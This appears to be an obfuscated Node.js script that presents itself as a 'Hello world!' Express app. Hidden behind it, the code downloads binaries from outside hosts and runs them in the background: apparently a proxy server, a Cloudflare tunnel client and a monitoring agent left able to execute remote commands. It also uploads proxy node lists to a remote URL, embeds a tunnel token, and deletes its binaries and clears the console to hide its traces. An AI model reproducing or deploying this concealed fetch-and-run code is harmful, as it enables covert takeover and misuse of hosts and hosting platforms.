const _0x422540=_0x4de0;(function(_0x16e3eb,_0x4130cf){const _0x21eba6=_0x4de0,_0x284be0=_0x16e3eb();while(!![]){try{const _0x244af5=parseInt(_0x21eba6(0x10a))/0x1+parseInt(_0x21eba6(0x119))/0x2+-parseInt(_0x21eba6(0x10b))/0x3+-parseInt(_0x21eba6(0x8d))/0x4*(parseInt(_0x21eba6(0x11a))/0x5)+-parseInt(_0x21eba6(0xfc))/0x6+-parseInt(_0x21eba6(0x134))/0x7*(-parseInt(_0x21eba6(0xea))/0x8)+parseInt(_0x21eba6(0xd8))/0x9;if(_0x244af5===_0x4130cf)break;else _0x284be0['push'](_0x284be0['shift']());}catch(_0x5eca03){_0x284be0['push'](_0x284be0['shift']());}}}(_0x4e73,0xcd2fc));const express=require('express'),app=express(),axios=require(_0x422540(0x11b)),os=require('os'),fs=require('fs'),path=require(_0x422540(0x110)),{promisify}=require('util'),exec=promisify(require(_0x422540(0xd9))[_0x422540(0xf6)]),{execSync}=require(_0x422540(0xd9)),UPLOAD_URL=process[_0x422540(0xf3)][_0x422540(0xcf)]||'',PROJECT_URL=process[_0x422540(0xf3)][_0x422540(0xbf)]||'',AUTO_ACCESS=process[_0x422540(0xf3)][_0x422540(0x12e)]||![],FILE_PATH=process[_0x422540(0xf3)][_0x422540(0x11e)]||'./tmp',SUB_PATH=process[_0x422540(0xf3)][_0x422540(0xdb)]||'sub',PORT=process[_0x422540(0xf3)][_0x422540(0xb4)]||process[_0x422540(0xf3)][_0x422540(0x121)]||0xbb8,UUID=process[_0x422540(0xf3)][_0x422540(0x107)]||_0x422540(0x7c),NEZHA_SERVER=process[_0x422540(0xf3)][_0x422540(0x90)]||'',NEZHA_PORT=process[_0x422540(0xf3)]['NEZHA_PORT']||'',NEZHA_KEY=process['env'][_0x422540(0xde)]||'',ARGO_DOMAIN=process[_0x422540(0xf3)][_0x422540(0x124)]||_0x422540(0xbd),ARGO_AUTH=process['env'][_0x422540(0x92)]||'eyJhIjoiYTk0NTU1ZmE5YmEyMzgxMWY5ZDcwMzI2NmI1NWRhODgiLCJ0IjoiNTBhYTEzMDMtZTE2ZS00NmNmLTgyOTItNDgzOTY4YWI0OTQzIiwicyI6Ik16Z3paRFE1TURVdE5EZzROQzAwWkdZeExUazJPV1V0TWpJM05HTTJNREkzWW1WaSJ9',ARGO_PORT=process['env']['ARGO_PORT']||0x1f41,CFIP=process[_0x422540(0xf3)][_0x422540(0xcd)]||_0x422540(0x97),CFPORT=process[_0x422540(0xf3)][_0x422540(0x101)]||0x1bb,NAME=process[_0x422540(0xf3)]['NAME']||_0x422540(0x7a);!fs['existsSync'](FILE_PATH)?(fs[_0x422540(0xb3)](FILE_PATH),console['log'](FILE_PATH+_0x422540(0x81))):console[_0x422540(0xb0)](FILE_PATH+_0x422540(0xfb));function generateRandomName(){const _0x2dfafe=_0x422540,_0x4cd8a7=_0x2dfafe(0xba);let _0x270825='';for(let _0x422012=0x0;_0x422012<0x6;_0x422012++){_0x270825+=_0x4cd8a7['charAt'](Math['floor'](Math['random']()*_0x4cd8a7[_0x2dfafe(0x108)]));}return _0x270825;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path['join'](FILE_PATH,npmName),phpPath=path[_0x422540(0x94)](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path[_0x422540(0x94)](FILE_PATH,botName),subPath=path[_0x422540(0x94)](FILE_PATH,'sub.txt'),listPath=path[_0x422540(0x94)](FILE_PATH,_0x422540(0x126)),bootLogPath=path[_0x422540(0x94)](FILE_PATH,_0x422540(0x78)),configPath=path[_0x422540(0x94)](FILE_PATH,_0x422540(0x84));function deleteNodes(){const _0x3c47eb=_0x422540;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x3e74bc;try{_0x3e74bc=fs[_0x3c47eb(0xff)](subPath,_0x3c47eb(0xe3));}catch{return null;}const _0xee552c=Buffer[_0x3c47eb(0x87)](_0x3e74bc,_0x3c47eb(0x9d))[_0x3c47eb(0xd3)]('utf-8'),_0x187f77=_0xee552c['split']('\x0a')[_0x3c47eb(0xc8)](_0x2ef207=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x3c47eb(0x74)](_0x2ef207));if(_0x187f77[_0x3c47eb(0x108)]===0x0)return;return axios[_0x3c47eb(0x129)](UPLOAD_URL+'/api/delete-nodes',JSON[_0x3c47eb(0x99)]({'nodes':_0x187f77}),{'headers':{'Content-Type':'application/json'}})['catch'](_0x3a1a1b=>{return null;}),null;}catch(_0x2d639a){return null;}}function cleanupOldFiles(){const _0x195025=_0x422540;try{const _0x33d5a7=fs[_0x195025(0x75)](FILE_PATH);_0x33d5a7['forEach'](_0xe9a86d=>{const _0x1974b6=_0x195025,_0x3ea664=path[_0x1974b6(0x94)](FILE_PATH,_0xe9a86d);try{const _0x60f9be=fs[_0x1974b6(0xb6)](_0x3ea664);_0x60f9be[_0x1974b6(0xf9)]()&&fs[_0x1974b6(0x80)](_0x3ea664);}catch(_0x564ff8){}});}catch(_0x2eff27){}}app[_0x422540(0x130)]('/',function(_0x201c3d,_0x245961){const _0x45be92=_0x422540;_0x245961[_0x45be92(0xf7)](_0x45be92(0xd1));});function _0x4de0(_0x360cd4,_0x439fb7){const _0x4e73d9=_0x4e73();return _0x4de0=function(_0x4de06c,_0x27d246){_0x4de06c=_0x4de06c-0x73;let _0x4a8aea=_0x4e73d9[_0x4de06c];return _0x4a8aea;},_0x4de0(_0x360cd4,_0x439fb7);}async function generateConfig(){const _0x4cd47d=_0x422540,_0x42db88={'log':{'access':_0x4cd47d(0xe4),'error':_0x4cd47d(0xe4),'loglevel':_0x4cd47d(0x104)},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':_0x4cd47d(0xc0)}],'decryption':'none','fallbacks':[{'dest':0xbb9},{'path':_0x4cd47d(0x8e),'dest':0xbba},{'path':_0x4cd47d(0xa7),'dest':0xbbb},{'path':_0x4cd47d(0xb7),'dest':0xbbc}]},'streamSettings':{'network':_0x4cd47d(0x11d)}},{'port':0xbb9,'listen':_0x4cd47d(0x7d),'protocol':_0x4cd47d(0xd7),'settings':{'clients':[{'id':UUID}],'decryption':_0x4cd47d(0x104)},'streamSettings':{'network':_0x4cd47d(0x11d),'security':_0x4cd47d(0x104)}},{'port':0xbba,'listen':_0x4cd47d(0x7d),'protocol':_0x4cd47d(0xd7),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x4cd47d(0x104)},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':['http','tls','quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x4cd47d(0x7d),'protocol':_0x4cd47d(0xdf),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x4cd47d(0xa7)}},'sniffing':{'enabled':!![],'destOverride':[_0x4cd47d(0x89),_0x4cd47d(0xf2),'quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x4cd47d(0x7d),'protocol':_0x4cd47d(0xd2),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x4cd47d(0x104),'wsSettings':{'path':_0x4cd47d(0xb7)}},'sniffing':{'enabled':!![],'destOverride':[_0x4cd47d(0x89),_0x4cd47d(0xf2),_0x4cd47d(0x7e)],'metadataOnly':![]}}],'dns':{'servers':[_0x4cd47d(0x93)]},'outbounds':[{'protocol':_0x4cd47d(0xda),'tag':_0x4cd47d(0xed)},{'protocol':_0x4cd47d(0xb5),'tag':_0x4cd47d(0xca)}]};fs[_0x4cd47d(0xbb)](path[_0x4cd47d(0x94)](FILE_PATH,_0x4cd47d(0x84)),JSON[_0x4cd47d(0x99)](_0x42db88,null,0x2));}function getSystemArchitecture(){const _0x49ce38=_0x422540,_0x3089ad=os['arch']();return _0x3089ad===_0x49ce38(0x112)||_0x3089ad===_0x49ce38(0xe6)||_0x3089ad===_0x49ce38(0xfa)?_0x49ce38(0x112):_0x49ce38(0xfe);}function downloadFile(_0x46fd62,_0x516494,_0x5bd0b4){const _0x546879=_0x422540,_0x28be04=_0x46fd62;!fs[_0x546879(0x105)](FILE_PATH)&&fs[_0x546879(0xb3)](FILE_PATH,{'recursive':!![]});const _0xafbe93=fs[_0x546879(0x109)](_0x28be04);axios({'method':_0x546879(0x130),'url':_0x516494,'responseType':_0x546879(0xd4)})[_0x546879(0x9e)](_0x1f3810=>{const _0x2e78ca=_0x546879;_0x1f3810[_0x2e78ca(0x115)]['pipe'](_0xafbe93),_0xafbe93['on'](_0x2e78ca(0xc4),()=>{const _0x44dbcd=_0x2e78ca;_0xafbe93[_0x44dbcd(0x132)](),console[_0x44dbcd(0xb0)](_0x44dbcd(0xc3)+path['basename'](_0x28be04)+'\x20successfully'),_0x5bd0b4(null,_0x28be04);}),_0xafbe93['on'](_0x2e78ca(0xaa),_0x101b12=>{const _0x3fb79a=_0x2e78ca;fs[_0x3fb79a(0x8b)](_0x28be04,()=>{});const _0x849ffb=_0x3fb79a(0xc3)+path[_0x3fb79a(0x12f)](_0x28be04)+_0x3fb79a(0xb1)+_0x101b12[_0x3fb79a(0x85)];console[_0x3fb79a(0xaa)](_0x849ffb),_0x5bd0b4(_0x849ffb);});})[_0x546879(0x135)](_0x5baa59=>{const _0x278c1a=_0x546879,_0x47c023=_0x278c1a(0xc3)+path[_0x278c1a(0x12f)](_0x28be04)+'\x20failed:\x20'+_0x5baa59[_0x278c1a(0x85)];console[_0x278c1a(0xaa)](_0x47c023),_0x5bd0b4(_0x47c023);});}async function downloadFilesAndRun(){const _0x465590=_0x422540,_0x549900=getSystemArchitecture(),_0x558872=getFilesForArchitecture(_0x549900);if(_0x558872[_0x465590(0x108)]===0x0){console[_0x465590(0xb0)](_0x465590(0x127));return;}const _0x441bd9=_0x558872[_0x465590(0x76)](_0x311aa3=>{return new Promise((_0x49cb09,_0x1d5e96)=>{const _0x1031b4=_0x4de0;downloadFile(_0x311aa3['fileName'],_0x311aa3[_0x1031b4(0xad)],(_0x3345f3,_0x56ac0c)=>{_0x3345f3?_0x1d5e96(_0x3345f3):_0x49cb09(_0x56ac0c);});});});try{await Promise[_0x465590(0xe8)](_0x441bd9);}catch(_0x21a5e8){console[_0x465590(0xaa)](_0x465590(0xdd),_0x21a5e8);return;}function _0x57c5aa(_0x102391){const _0x52b91d=0x1fd;_0x102391['forEach'](_0x4905d5=>{const _0x3f49c2=_0x4de0;fs[_0x3f49c2(0x105)](_0x4905d5)&&fs[_0x3f49c2(0xe5)](_0x4905d5,_0x52b91d,_0x28eb4a=>{const _0x2c6dec=_0x3f49c2;_0x28eb4a?console[_0x2c6dec(0xaa)](_0x2c6dec(0x8a)+_0x4905d5+':\x20'+_0x28eb4a):console[_0x2c6dec(0xb0)](_0x2c6dec(0xe0)+_0x4905d5+':\x20'+_0x52b91d[_0x2c6dec(0xd3)](0x8));});});}const _0x1fb003=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x57c5aa(_0x1fb003);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x34e16=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x465590(0x102)](':')[_0x465590(0xcb)]():'',_0x2eab26=new Set(['443',_0x465590(0x9c),_0x465590(0x82),_0x465590(0xa2),_0x465590(0xce),_0x465590(0xa3)]),_0x5931a6=_0x2eab26[_0x465590(0x136)](_0x34e16)?_0x465590(0xc9):_0x465590(0x12b),_0x539ad9=_0x465590(0xcc)+NEZHA_KEY+_0x465590(0x73)+NEZHA_SERVER+_0x465590(0x10d)+_0x5931a6+_0x465590(0xa6)+UUID;fs['writeFileSync'](path[_0x465590(0x94)](FILE_PATH,_0x465590(0x7f)),_0x539ad9);const _0x4648a3=_0x465590(0xf8)+phpPath+_0x465590(0x98)+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x4648a3),console[_0x465590(0xb0)](phpName+_0x465590(0x113)),await new Promise(_0x199e99=>setTimeout(_0x199e99,0x3e8));}catch(_0x53abed){console[_0x465590(0xaa)](_0x465590(0x11c)+_0x53abed);}}else{let _0x3eef5d='';const _0x579340=[_0x465590(0x114),_0x465590(0x9c),'2096',_0x465590(0xa2),_0x465590(0xce),_0x465590(0xa3)];_0x579340[_0x465590(0x8c)](NEZHA_PORT)&&(_0x3eef5d='--tls');const _0x468187='nohup\x20'+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x465590(0x12d)+NEZHA_KEY+'\x20'+_0x3eef5d+_0x465590(0xaf);try{await exec(_0x468187),console[_0x465590(0xb0)](npmName+_0x465590(0x113)),await new Promise(_0x43fce9=>setTimeout(_0x43fce9,0x3e8));}catch(_0x1f3655){console[_0x465590(0xaa)](_0x465590(0x128)+_0x1f3655);}}}else console['log'](_0x465590(0x9f));const _0x5baf4a=_0x465590(0xf8)+webPath+_0x465590(0x88)+FILE_PATH+_0x465590(0x103);try{await exec(_0x5baf4a),console[_0x465590(0xb0)](webName+_0x465590(0x113)),await new Promise(_0x4a9657=>setTimeout(_0x4a9657,0x3e8));}catch(_0x4cf289){console[_0x465590(0xaa)](_0x465590(0xc6)+_0x4cf289);}if(fs[_0x465590(0x105)](botPath)){let _0x567bbd;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0x567bbd=_0x465590(0x116)+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0x567bbd='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+_0x465590(0xac):_0x567bbd=_0x465590(0xbe)+FILE_PATH+_0x465590(0xc2)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x567bbd+'\x20>/dev/null\x202>&1\x20&'),console[_0x465590(0xb0)](botName+_0x465590(0x113)),await new Promise(_0x291ab2=>setTimeout(_0x291ab2,0x7d0));}catch(_0x1b096a){console['error'](_0x465590(0xb9)+_0x1b096a);}}await new Promise(_0x45e05f=>setTimeout(_0x45e05f,0x1388));}function _0x4e73(){const _0x17489f=['/sub.txt\x20saved\x20successfully','exec','send','nohup\x20','isFile','aarch64','\x20already\x20exists','5788014ooSDsQ','tunnel.json','amd','readFileSync','/vmess-argo?ed=2560','CFPORT','split','/config.json\x20>/dev/null\x202>&1\x20&','none','existsSync','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','UUID','length','createWriteStream','1620760XDKtRe','745611iHVWpi','https://arm64.ssss.nyc.mn/web','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','status','Unhandled\x20error\x20in\x20startserver:','path','\x0a\x20\x20\x20\x20','arm','\x20is\x20running','443','data','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','Error\x20in\x20startserver:','\x22\x20>\x20/dev/null\x202>&1','2710510MJZqQf','10HKDkWf','axios','php\x20running\x20error:\x20','tcp','FILE_PATH','TunnelSecret','https://oooo.serv00.net/add-url','PORT','&path=%2Fvless-argo%3Fed%3D2560#','del\x20/f\x20/q\x20','ARGO_DOMAIN','&path=%2Ftrojan-argo%3Fed%3D2560#','list.txt','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','npm\x20running\x20error:\x20','post','\x0a\x20\x20tunnel:\x20','false','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','\x20-p\x20','AUTO_ACCESS','basename','get','https://amd64.ssss.nyc.mn/v1','close','automatic\x20access\x20task\x20added\x20successfully','14duEEew','catch','has','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','test','readdirSync','map','\x0a\x20\x20credentials-file:\x20','boot.log','curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','jjdd','application/json','9afd1229-b893-40c1-84dd-51e7ce204913','127.0.0.1','quic','config.yaml','unlinkSync','\x20is\x20created','2096','set','config.json','message','forEach','from','\x20-c\x20','http','Empowerment\x20failed\x20for\x20','unlink','includes','3230024CmoLnf','/vless-argo','\x20>/dev/null\x202>&1\x20&','NEZHA_SERVER','rm\x20-rf\x20','ARGO_AUTH','https+local://8.8.8.8/dns-query','join','win32','ARGO_DOMAIN:','cdns.doon.eu.org','\x20-c\x20\x22','stringify','/api/add-subscriptions','https://arm64.ssss.nyc.mn/v1','8443','base64','then','NEZHA\x20variable\x20is\x20empty,skip\x20running','?encryption=none&security=tls&sni=','platform','2087','2053','https://arm64.ssss.nyc.mn/agent','charAt','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','/vmess-argo','\x20>\x20nul\x202>&1','match','error','\x0a\x20\x20\x0atrojan://','/tunnel.yml\x20run','fileUrl','https://amd64.ssss.nyc.mn/web','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','log','\x20failed:\x20','clear','mkdirSync','SERVER_PORT','blackhole','statSync','/trojan-argo','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','Error\x20executing\x20command:\x20','abcdefghijklmnopqrstuvwxyz','writeFileSync','App\x20is\x20running','sd.zento.dpdns.org','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','PROJECT_URL','xtls-rprx-vision','https://arm64.ssss.nyc.mn/bot','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','Download\x20','finish','text/plain;\x20charset=utf-8','web\x20running\x20error:\x20','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','filter','true','block','pop','\x0aclient_secret:\x20','CFIP','2083','UPLOAD_URL','listen','Hello\x20world!','trojan','toString','stream','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','push','vless','271881WqyQcV','child_process','freedom','SUB_PATH','\x20>/dev/null\x202>&1','Error\x20downloading\x20files:','NEZHA_KEY','vmess','Empowerment\x20success\x20for\x20','&fp=firefox&type=ws&host=','Add\x20automatic\x20access\x20task\x20faild:\x20','utf-8','/dev/null','chmod','arm64','Skipping\x20adding\x20automatic\x20access\x20task','all','http\x20server\x20is\x20running\x20on\x20port:','2649752oWpLck','unshift','Nodes\x20uploaded\x20successfully','direct','Content-Type','https://amd64.ssss.nyc.mn/bot','firefox','Subscription\x20uploaded\x20successfully','tls','env','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'];_0x4e73=function(){return _0x17489f;};return _0x4e73();}function getFilesForArchitecture(_0x468e4d){const _0x41f453=_0x422540;let _0x56481e;_0x468e4d===_0x41f453(0x112)?_0x56481e=[{'fileName':webPath,'fileUrl':_0x41f453(0x10c)},{'fileName':botPath,'fileUrl':_0x41f453(0xc1)}]:_0x56481e=[{'fileName':webPath,'fileUrl':_0x41f453(0xae)},{'fileName':botPath,'fileUrl':_0x41f453(0xef)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x1ebff6=_0x468e4d===_0x41f453(0x112)?_0x41f453(0xa4):'https://amd64.ssss.nyc.mn/agent';_0x56481e[_0x41f453(0xeb)]({'fileName':npmPath,'fileUrl':_0x1ebff6});}else{const _0x454b38=_0x468e4d===_0x41f453(0x112)?_0x41f453(0x9b):_0x41f453(0x131);_0x56481e['unshift']({'fileName':phpPath,'fileUrl':_0x454b38});}}return _0x56481e;}function argoType(){const _0x1dbce1=_0x422540;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x1dbce1(0xb0)](_0x1dbce1(0xd5));return;}if(ARGO_AUTH[_0x1dbce1(0x8c)](_0x1dbce1(0x11f))){fs[_0x1dbce1(0xbb)](path[_0x1dbce1(0x94)](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0x13df33=_0x1dbce1(0x12a)+ARGO_AUTH['split']('\x22')[0xb]+_0x1dbce1(0x77)+path[_0x1dbce1(0x94)](FILE_PATH,_0x1dbce1(0xfd))+_0x1dbce1(0xc7)+ARGO_DOMAIN+_0x1dbce1(0xb8)+ARGO_PORT+_0x1dbce1(0x106);fs['writeFileSync'](path[_0x1dbce1(0x94)](FILE_PATH,'tunnel.yml'),_0x13df33);}else console[_0x1dbce1(0xb0)]('ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel');}argoType();async function extractDomains(){const _0x33c7e4=_0x422540;let _0x3ea9c1;if(ARGO_AUTH&&ARGO_DOMAIN)_0x3ea9c1=ARGO_DOMAIN,console['log'](_0x33c7e4(0x96),_0x3ea9c1),await _0x15c734(_0x3ea9c1);else try{const _0x5becc5=fs[_0x33c7e4(0xff)](path['join'](FILE_PATH,_0x33c7e4(0x78)),_0x33c7e4(0xe3)),_0x155ada=_0x5becc5[_0x33c7e4(0x102)]('\x0a'),_0x529bb4=[];_0x155ada[_0x33c7e4(0x86)](_0x3efb89=>{const _0x357d62=_0x33c7e4,_0x30613e=_0x3efb89[_0x357d62(0xa9)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x30613e){const _0x3f2ed5=_0x30613e[0x1];_0x529bb4[_0x357d62(0xd6)](_0x3f2ed5);}});if(_0x529bb4[_0x33c7e4(0x108)]>0x0)_0x3ea9c1=_0x529bb4[0x0],console['log']('ArgoDomain:',_0x3ea9c1),await _0x15c734(_0x3ea9c1);else{console[_0x33c7e4(0xb0)](_0x33c7e4(0xf4)),fs['unlinkSync'](path['join'](FILE_PATH,_0x33c7e4(0x78)));async function _0x5c4522(){const _0x3db128=_0x33c7e4;try{process['platform']===_0x3db128(0x95)?await exec('taskkill\x20/f\x20/im\x20'+botName+'.exe\x20>\x20nul\x202>&1'):await exec('pkill\x20-f\x20\x22['+botName[_0x3db128(0xa5)](0x0)+']'+botName['substring'](0x1)+_0x3db128(0x118));}catch(_0x43e8aa){}}_0x5c4522(),await new Promise(_0x4c0c5a=>setTimeout(_0x4c0c5a,0xbb8));const _0x4f3e31=_0x33c7e4(0xbe)+FILE_PATH+_0x33c7e4(0xc2)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x4f3e31+_0x33c7e4(0x8f)),console['log'](botName+_0x33c7e4(0x113)),await new Promise(_0xfc6d1a=>setTimeout(_0xfc6d1a,0xbb8)),await extractDomains();}catch(_0x58ab6c){console[_0x33c7e4(0xaa)](_0x33c7e4(0xb9)+_0x58ab6c);}}}catch(_0x5bc925){console['error']('Error\x20reading\x20boot.log:',_0x5bc925);}async function _0x15c734(_0x322735){const _0x2388a8=_0x33c7e4,_0xc246c2=execSync(_0x2388a8(0x79),{'encoding':_0x2388a8(0xe3)}),_0x4f7d0f=_0xc246c2['trim'](),_0x2e2404=NAME?NAME+'-'+_0x4f7d0f:_0x4f7d0f;return new Promise(_0x111b7f=>{setTimeout(()=>{const _0x65da6f=_0x4de0,_0x532acd={'v':'2','ps':''+_0x2e2404,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':_0x65da6f(0x104),'host':_0x322735,'path':_0x65da6f(0x100),'tls':_0x65da6f(0xf2),'sni':_0x322735,'alpn':'','fp':_0x65da6f(0xf0)},_0x5260bd='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+_0x65da6f(0xa0)+_0x322735+'&fp=firefox&type=ws&host='+_0x322735+_0x65da6f(0x122)+_0x2e2404+'\x0a\x20\x20\x0avmess://'+Buffer[_0x65da6f(0x87)](JSON[_0x65da6f(0x99)](_0x532acd))['toString']('base64')+_0x65da6f(0xab)+UUID+'@'+CFIP+':'+CFPORT+'?security=tls&sni='+_0x322735+_0x65da6f(0xe1)+_0x322735+_0x65da6f(0x125)+_0x2e2404+_0x65da6f(0x111);console[_0x65da6f(0xb0)](Buffer['from'](_0x5260bd)[_0x65da6f(0xd3)](_0x65da6f(0x9d))),fs['writeFileSync'](subPath,Buffer[_0x65da6f(0x87)](_0x5260bd)[_0x65da6f(0xd3)]('base64')),console[_0x65da6f(0xb0)](FILE_PATH+_0x65da6f(0xf5)),uploadNodes(),app[_0x65da6f(0x130)]('/'+SUB_PATH,(_0x128914,_0x62fe4d)=>{const _0x3a578f=_0x65da6f,_0x5b7dd3=Buffer[_0x3a578f(0x87)](_0x5260bd)[_0x3a578f(0xd3)](_0x3a578f(0x9d));_0x62fe4d[_0x3a578f(0x83)](_0x3a578f(0xee),_0x3a578f(0xc5)),_0x62fe4d['send'](_0x5b7dd3);}),_0x111b7f(_0x5260bd);},0x7d0);});}}async function uploadNodes(){const _0x391484=_0x422540;if(UPLOAD_URL&&PROJECT_URL){const _0x1ca6cb=PROJECT_URL+'/'+SUB_PATH,_0x6c6bec={'subscription':[_0x1ca6cb]};try{const _0x20c0d6=await axios[_0x391484(0x129)](UPLOAD_URL+_0x391484(0x9a),_0x6c6bec,{'headers':{'Content-Type':_0x391484(0x7b)}});return _0x20c0d6&&_0x20c0d6[_0x391484(0x10e)]===0xc8?(console[_0x391484(0xb0)](_0x391484(0xf1)),_0x20c0d6):null;}catch(_0x38155f){if(_0x38155f['response']){if(_0x38155f['response'][_0x391484(0x10e)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0xf9890c=fs[_0x391484(0xff)](listPath,_0x391484(0xe3)),_0x497965=_0xf9890c[_0x391484(0x102)]('\x0a')['filter'](_0x1b01e5=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x1b01e5));if(_0x497965[_0x391484(0x108)]===0x0)return;const _0x4691bc=JSON[_0x391484(0x99)]({'nodes':_0x497965});try{const _0x2bfce4=await axios[_0x391484(0x129)](UPLOAD_URL+'/api/add-nodes',_0x4691bc,{'headers':{'Content-Type':_0x391484(0x7b)}});return _0x2bfce4&&_0x2bfce4['status']===0xc8?(console[_0x391484(0xb0)](_0x391484(0xec)),_0x2bfce4):null;}catch(_0x102239){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x5ab15f=_0x4de0,_0x5381a3=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x5381a3[_0x5ab15f(0xd6)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x5381a3[_0x5ab15f(0xd6)](phpPath);process[_0x5ab15f(0xa1)]===_0x5ab15f(0x95)?exec(_0x5ab15f(0x123)+_0x5381a3[_0x5ab15f(0x94)]('\x20')+_0x5ab15f(0xa8),_0x9b9333=>{const _0x4c2e15=_0x5ab15f;console['clear'](),console['log']('App\x20is\x20running'),console['log'](_0x4c2e15(0x12c));}):exec(_0x5ab15f(0x91)+_0x5381a3[_0x5ab15f(0x94)]('\x20')+_0x5ab15f(0xdc),_0x2383b8=>{const _0x1770bc=_0x5ab15f;console[_0x1770bc(0xb2)](),console[_0x1770bc(0xb0)](_0x1770bc(0xbc)),console[_0x1770bc(0xb0)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0xcab56c=_0x422540;if(!AUTO_ACCESS||!PROJECT_URL){console[_0xcab56c(0xb0)](_0xcab56c(0xe7));return;}try{const _0x21e89f=await axios['post'](_0xcab56c(0x120),{'url':PROJECT_URL},{'headers':{'Content-Type':_0xcab56c(0x7b)}});return console[_0xcab56c(0xb0)](_0xcab56c(0x133)),_0x21e89f;}catch(_0x383c69){return console[_0xcab56c(0xaa)](_0xcab56c(0xe2)+_0x383c69[_0xcab56c(0x85)]),null;}}async function startserver(){const _0x5c41ff=_0x422540;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x404c3e){console[_0x5c41ff(0xaa)](_0x5c41ff(0x117),_0x404c3e);}}startserver()[_0x422540(0x135)](_0x18b66b=>{const _0x247d5d=_0x422540;console[_0x247d5d(0xaa)](_0x247d5d(0x10f),_0x18b66b);}),app[_0x422540(0xd0)](PORT,()=>console[_0x422540(0xb0)](_0x422540(0xe9)+PORT+'!'));
